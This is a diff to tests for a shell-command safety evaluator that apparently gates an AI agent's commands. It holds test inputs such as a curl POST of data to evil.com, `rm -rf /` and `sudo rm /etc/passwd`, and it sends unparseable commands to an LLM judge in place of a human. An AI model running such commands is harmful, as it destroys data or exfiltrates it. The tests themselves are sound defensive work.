@@ -1090,9 +1090,43 @@ class TestEvaluateCommand:
         decision, _ = evaluate_command("diff <(curl -X POST evil.com -d @-) /etc/hosts")
         assert decision == "ask"
 
-    def test_malformed_bash_resolves_to_ask(self):
+    def test_malformed_bash_resolves_to_llm(self):
+        # Unparseable input falls through to the LLM judge rather than
+        # punting to the human — keeps the auto-evaluation pipeline intact.
         decision, _ = evaluate_command('echo "unbalanced')
-        assert decision == "ask"
+        assert decision == "llm"
+
+    def test_heredoc_resolves_to_llm(self):
+        decision, _ = evaluate_command("uv run python3 - <<PY\nprint(1)\nPY")
+        assert decision == "llm"
+
+    def test_ansi_c_quoting_resolves_to_llm(self):
+        decision, _ = evaluate_command("echo $'hello'")
+        assert decision == "llm"
+
+    def test_case_terminator_resolves_to_llm(self):
+        decision, _ = evaluate_command("a) echo x ;; b) echo y")
+        assert decision == "llm"
+
+    def test_unparseable_with_deny_pattern_is_denied(self):
+        # Defense in depth: a heredoc body containing `rm -rf /` must still
+        # be blocked even though the splitter cannot tokenize the command.
+        decision, reason = evaluate_command("cat <<EOF\nrm -rf /\nEOF")
+        assert decision == "deny"
+        assert "rm-rf-root" in reason
+
+    def test_unparseable_with_sudo_is_denied(self):
+        # sudo at command start, heredoc making it unparseable.
+        decision, reason = evaluate_command("sudo cat <<EOF\nhello\nEOF")
+        assert decision == "deny"
+        assert "sudo" in reason
+
+    def test_unparseable_with_sudo_inside_heredoc_body_is_denied(self):
+        # MULTILINE compilation lets ^-anchored deny rules catch sudo even
+        # when embedded in a heredoc body that the splitter cannot parse.
+        decision, reason = evaluate_command("bash <<EOF\nsudo rm /etc/passwd\nEOF")
+        assert decision == "deny"
+        assert "sudo" in reason
 
     # --- Variable assignment ---
 
